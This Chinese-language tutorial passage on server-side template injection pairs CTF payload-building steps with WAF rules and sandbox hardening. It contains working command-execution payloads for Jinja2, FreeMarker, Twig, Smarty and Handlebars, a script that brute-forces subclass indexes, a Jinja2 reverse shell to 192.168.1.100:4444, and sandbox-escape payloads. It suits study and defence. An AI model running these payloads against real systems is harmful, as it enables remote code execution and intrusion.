    - 利用内置函数：`{{ lipsum.__globals__['os'].popen('ls').read() }}`

  - **示例场景**：Flask 应用中，攻击者通过 URL 参数注入 payload，获取服务器用户名或读取文件。

- **FreeMarker（Java）**：

  - **特点**：支持 Java 类调用，通过 `?new()`实例化对象。

  - **利用方式**：

    - 执行命令：

      ```freemarker
      ${"freemarker.template.utility.Execute"?new()("id")}
      ```

    - 读取文件：

      ```freemarker
      <#include "/etc/passwd">
      ```

  - **示例场景**：在 Java Web 应用中，攻击者利用 FreeMarker 的 `Execute`类执行系统命令。

- **Twig（PHP）**：

  - **特点**：支持过滤器和回调函数，可通过 `_self.env`访问环境对象。

  - **利用方式**：

    - 执行命令：

      ```twig
      {{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
      ```

    - 访问配置：`{{ app.request.server.all() }}`

  - **示例场景**：在 PHP 应用中，攻击者利用 Twig 的回调函数执行 PHP 代码。

- **Smarty（PHP，老版本）**：

  - **特点**：老版本支持 `{php}`标签，可直接执行 PHP 代码。

  - **利用方式**：

    ```smarty
    {php}echo shell_exec('id');{/php}
    ```

  - **注意**：新版本已移除 `{php}`标签，但若安全配置不当，仍可能被利用。

- **Handlebars（JavaScript）**：

  - **特点**：服务端渲染时可通过原型链访问敏感对象。

  - **利用方式**：

    ```handlebars
    {{#with "constructor"}}{{this.prototype.toString.caller}}{{/with}}
    ```

  - **示例场景**：在 Node.js 应用中，攻击者通过 Handlebars 访问全局对象。

**差异总结**：

- Jinja2 依赖 Python 的反射机制，适合构造复杂 payload。
- FreeMarker 利用 Java 类调用，危害高但依赖环境。
- Twig 和 Smarty 依赖过滤器或标签，需熟悉 PHP 生态。
- Handlebars 在服务端渲染场景较少，但原型链攻击需关注。

### 9.3 如何在 CTF 中快速构造 payload？

在 CTF 比赛中，快速构造 SSTI payload 是关键，需结合信息收集和自动化工具。以下是具体步骤和技巧：

- **步骤 1：确认模板引擎**：

  - 测试常见模板语法：
    - Jinja2：`{{7*7}}`或 `{% print(1+1) %}`
    - FreeMarker：`${7*7}`
    - Twig：`{{7*7}}`或 `{% do 1+1 %}`
  - 检查响应头、页面特征或错误信息，推测框架（如 Flask 通常使用 Jinja2）。

- **步骤 2：构造基础 payload**：

  - 读取配置：`{{ config }}`（Jinja2）或 `{{ app.request.server.all() }}`（Twig）。
  - 访问全局对象：`{{ lipsum.__globals__ }}`（Jinja2）或 `${"java.lang.Runtime"?new()}`（FreeMarker）。

- **步骤 3：定位危险类**：

  - 在 Jinja2 中，`__subclasses__`包含 Python 的所有子类，需枚举找到 `os._wrap_close`等类（通常在索引 100-200 之间）。

  - 示例自动化脚本：

    ```python
    import requests
    
    url = input('URL地址：')
    method = input('HTTP方法（GET/POST）：')
    param = input('参数名：')
    for i in range(500):
        data = {param: f"{{''.__class__.__mro__[1].__subclasses__()[{i}].__init__.__globals__}}"}
        try:
            if method.upper() == 'POST':
                response = requests.post(url, data=data)
            else:
                response = requests.get(url, params=data)
            if response.status_code == 200 and 'popen' in response.text:
                print(f"找到目标类：索引 {i}")
                break
        except:
            pass
    ```

- **步骤 4：构造 RCE payload**：

  - Jinja2 示例：

    ```jinja2
    {{ ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('cat flag.txt').read() }}
    ```

  - FreeMarker 示例：

    ```freemarker
    ${"freemarker.template.utility.Execute"?new()("cat flag.txt")}
    ```

- **步骤 5：处理过滤**：

  - 如果 `{{}}`被过滤，使用 `{% print() %}`。

  - 如果数字被过滤，使用 `length`过滤器：

    ```jinja2
    {% set num="1111"|length %}
    {{ ''.__class__.__mro__[num].__subclasses__()[num*num*num+num].__init__.__globals__['os'].popen('ls').read() }}
    ```

- **无回显场景**：

  - 使用 DNS 外带或反弹 shell：

    ```jinja2
    {{ ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"').read() }}
    ```

    监听：`nc -lvnp 4444`

- **工具支持**：

  - 使用 **tplmap**自动化构造 payload：

    ```bash
    python tplmap.py -u "http://example.com/?name=TEST" --os-shell
    ```

  - Burp Suite 的 Intruder 模块，批量测试 payload。

### 9.4 WAF 规则如何优化以防御 SSTI？

优化 WAF 规则以防御 SSTI 需要结合模板引擎语法和攻击特征，减少误报和漏报。以下是详细优化策略：

- **规则 1：匹配模板语法**：

  - 检测常见模板语法：`{{`, `{%`, `${`, `<%`, `#`等。

  - 正则表达式示例：

    ```regex
    (\{\{.*?\}\})|(\{%.*?%\})|(\${.*?})|(<%).*?%>
    ```

  - 示例 WAF 配置（伪代码）：

    ```nginx
    if ($request_uri ~ "(\{\{.*?\}\})|(\{%.*?%\})") {
        return 403;
    }
    ```

- **规则 2：匹配危险关键字**：

  - 检测 SSTI payload 中常见的关键字，如 `__class__`, `__globals__`, `popen`, `eval`, `exec`, `subclasses`。

  - 示例正则：

    ```regex
    (__class__)|(__globals__)|(popen)|(eval)|(exec)|(subclasses)
    ```

- **规则 3：上下文分析**：

  - 仅匹配关键字可能导致误报，需结合上下文。例如，检查关键字是否出现在 URL 参数、表单数据或 HTTP 头中。

  - 示例：若 `name`参数包含 `{{`且后跟 `config`或 `__globals__`，则拦截：

    ```python
    import re
    def waf_check(input_str):
        if re.search(r'\{\{.*?(config|__globals__).*?\}\}', input_str):
            return "Blocked: Potential SSTI"
        return input_str
    ```

- **规则 4：检测编码绕过**：

  - 检查 URL 编码、Unicode 编码或 Base64 编码后的模板语法：

    ```regex
    (%7B%7B)|(%7B%25)|(%24%7B)
    ```

- **规则 5：异常行为监控**：

  - 监控异常请求，如高频提交模板语法的 IP。

  - 示例：设置请求频率限制（每分钟 10 次）：

    ```nginx
    limit_req_zone $binary_remote_addr zone=ssti_limit:10m rate=10r/m;
    server {
        location / {
            limit_req zone=ssti_limit burst=20;
        }
    }
    ```

- **减少误报**：

  - 结合白名单：允许合法的模板语法（如 CMS 的合法模板编辑功能）。
  - 使用机器学习模型分析请求上下文，区分正常用户输入和恶意 payload。

- **工具支持**：

  - ModSecurity：配置自定义规则检测 SSTI 语法。
  - Cloudflare WAF：使用预定义规则集，结合自定义正则。

### 9.5 沙箱模式是否完全安全？

沙箱模式是模板引擎提供的一种安全机制，旨在限制模板的功能，防止执行危险操作。然而，沙箱模式并非完全安全，存在逃逸的可能性，尤其在旧版本或配置不当的情况下。

- **沙箱模式的原理**：

  - 沙箱模式通过限制模板访问危险对象（如 `__globals__`, `java.lang.Runtime`）或禁用某些功能（如文件操作、系统调用）来降低风险。

  - 示例（Jinja2 沙箱）：

    ```python
    from jinja2.sandbox import SandboxedEnvironment
    env = SandboxedEnvironment()
    env.filters = {}  # 禁用过滤器
    result = env.from_string("{{ ''.__class__ }}").render()
    # 输出：抛出 SecurityError
    ```

- **沙箱模式的局限性**：

  - **旧版本漏洞**：Jinja2 早期版本（如 2.8.x）存在沙箱逃逸漏洞。例如：

    ```jinja2
    {{ ''.format.__globals__['os'].popen('id').read() }}
    ```

    在旧版本中，可能绕过沙箱限制，访问文件或执行命令。

  - **配置不当**：若沙箱未正确配置（如未禁用过滤器或允许访问反射对象），攻击者可利用漏洞：

    ```jinja2
    {{ lipsum.__globals__['os'].popen('id').read() }}
    ```

  - **语言特性复杂性**：Python、Java 等语言的反射机制难以完全限制。例如，攻击者可能通过 `__getattribute__`或其他魔术方法绕过沙箱。

- **已知沙箱逃逸案例**：

  - **Jinja2 沙箱逃逸**（CVE-2019-8341）：

    - 漏洞描述：攻击者通过 `str.format`方法或过滤器链绕过沙箱限制。

    - 示例 payload：

      ```jinja2
      {{ ''.format.__globals__['os'].popen('id').read() }}
      ```

    - 修复：升级到 Jinja2 2.10.1 或更高版本。

  - **FreeMarker 沙箱逃逸**：

    - 攻击者可能通过 `?new()`调用未被限制的 Java 类：

      ```freemarker
      ${"java.lang.Runtime"?new().getRuntime().exec("id")}
      ```

    - 修复：配置 `TemplateClassResolver.SAFER_RESOLVER`。

- **提高沙箱安全性**：

  - **升级版本**：确保使用最新版本的模板引擎，修复已知漏洞。

  - **严格配置**：

    - Jinja2：禁用所有过滤器，限制 `__getattribute__`。

      ```python
      from jinja2.sandbox import SandboxedEnvironment
      class StrictSandbox(SandboxedEnvironment):
          def getattr(self, obj, attribute):
              if attribute.startswith('_'):
                  raise AttributeError('Access to private attributes is forbidden')
              return super().getattr(obj, attribute)
      env = StrictSandbox()
      ```

    - FreeMarker：限制类调用：

      ```java
      freemarkerConfig.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
      ```

  - **监控与审计**：记录模板引擎的异常行为，分析潜在的沙箱逃逸尝试。

  - **最小化功能**：仅启用必要的功能，避免暴露不必要的对象或方法。

- **结论**：

  - 沙箱模式可显著降低 SSTI 风险，但并非万无一失。攻击者可能利用模板引擎的复杂功能或语言特性（如 Python 的反射）绕过限制。开发者需结合输入过滤、权限控制和定期更新，确保沙箱的有效性。

------

## 十、引用

[^1]: https://blog.csdn.net/zl0_00_0/article/details/147957613
[^2]: OWASP Web Security Testing Guide
[^3]: PortSwigger Web Security Academy - Server-Side Template Injection
[^4]: SSTI Labs（如 ssti-labs 项目）